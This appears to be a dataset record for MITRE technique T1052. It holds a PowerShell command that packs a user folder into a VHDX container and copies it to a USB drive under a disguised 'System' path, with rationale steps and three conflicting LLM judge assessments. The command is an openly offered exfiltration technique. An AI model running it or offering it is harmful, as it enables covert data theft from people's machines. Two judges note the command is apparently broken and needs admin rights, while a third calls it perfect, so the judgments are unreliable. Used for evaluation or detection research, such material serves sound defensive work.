command: $tmp="C:\Temp\pack.vhdx"; New-VHD -Path $tmp -SizeBytes 1073741824 -Dynamic | Out-Null; Mount-DiskImage -ImagePath $tmp; $v=(Get-DiskImage $tmp | Get-Disk | Get-Partition | Where-Object DriveLetter | Get-Volume | Select-Object -First 1 -ExpandProperty DriveLetter); Format-Volume -DriveLetter $v -FileSystem NTFS -Force -Confirm:$false | Out-Null; Copy-Item "C:\Users\Public\Videos\*" "$v:\" -Recurse -Force; Dismount-DiskImage -ImagePath $tmp; $usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path "$usb:\System" -ItemType Directory -Force | Out-Null; Copy-Item $tmp "$usb:\System\drvs.vhdx" -Force
explanation: Packs data into a VHDX container locally, then copies that container file to a USB device to consolidate exfil data into a single file on removable media.
rationale_steps: Create and mount a temporary VHDX image.
Format and load it with target data.
Dismount and move the VHDX onto the USB in a plausible directory.

llm_judgments.syntactic_justification: The PowerShell is well-formed with balanced quotes, valid cmdlets/parameters, and proper statement separators.
llm_judgments.semantic_justification: While aligned with T1052’s intent, it likely fails operationally because the new VHDX is never initialized/partitioned (so no volume/drive letter to copy into) and mounting/formatting typically require admin/Hyper-V, making the claimed behavior unlikely to succeed.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper PowerShell syntax, balanced quotes and parentheses, appropriate variable assignments, proper piping, and correct cmdlet usage throughout.
llm_judgments.semantic_justification: The command perfectly aligns with T1052 by creating a VHDX container, copying sensitive data into it, and then transferring that container to a removable USB drive for physical exfiltration.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct PowerShell syntax, balanced elements, valid cmdlet usage, and proper parameter formatting.
llm_judgments.semantic_justification: The command cannot achieve its claimed intent under the specified 'Privilege: None' as creating, mounting, formatting, and dismounting VHDX files all require administrative privileges.
